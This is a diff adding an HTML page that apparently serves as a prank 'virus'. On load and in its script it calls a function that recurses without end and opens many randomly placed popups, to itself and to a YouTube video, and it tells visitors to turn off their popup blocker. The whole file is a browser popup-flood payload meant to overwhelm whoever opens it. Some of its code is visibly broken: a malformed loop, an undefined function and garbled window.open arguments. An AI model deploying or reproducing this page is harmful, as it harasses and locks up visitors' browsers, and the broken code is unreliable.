@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+    <meta charset="UTF-8"
+    name="viewport" content="width=device-width, initial-scale=1.0">
+<body onload="fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun(),fun()">
+    <p>disable popup blocker and refresh the page.</p>
+    
+    <script>
+        let popups = [];
+
+        function startPopups() {
+            for (let i = 0; i < 5, i++; ) { // Opens more windows immediately without waiting
+                openPopup();
+            }
+        }
+        
+
+        function fun(){
+            var randomnumber = Math.floor((Math.random()*1000)+ 200);
+            var randomWidth = Math.floor((Math.random()*500)+ 200);
+            var randomHeight = Math.floor((Math.random()*500)+ 200);
+            var randomX = Math.floor((Math.random()*screen.width));
+            var randomY = Math.floor((Math.random()*screen.height)); 
+            window.open('virus.html',"_blank",'PopUp',randomnumber,scrollbars=1,)
+            fun();
+            var features = `width=${randomWidth},height=${randomHeight},left=${randomX},top=${randomY},scrollbars=1,resizable=1`;
+            window.open('https://www.youtube.com/watch?v=xvFZjo5PgG0&ab_channel=Duran', '_blank', features);
+        }
+
+        function openPopupsContinuously() {
+            openPopup();
+            requestAnimationFrame(openPopupsContinuously); // Lowers window opening cooldown
+        }
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+        fun();
+    </script>
+
+</body>
+</html>
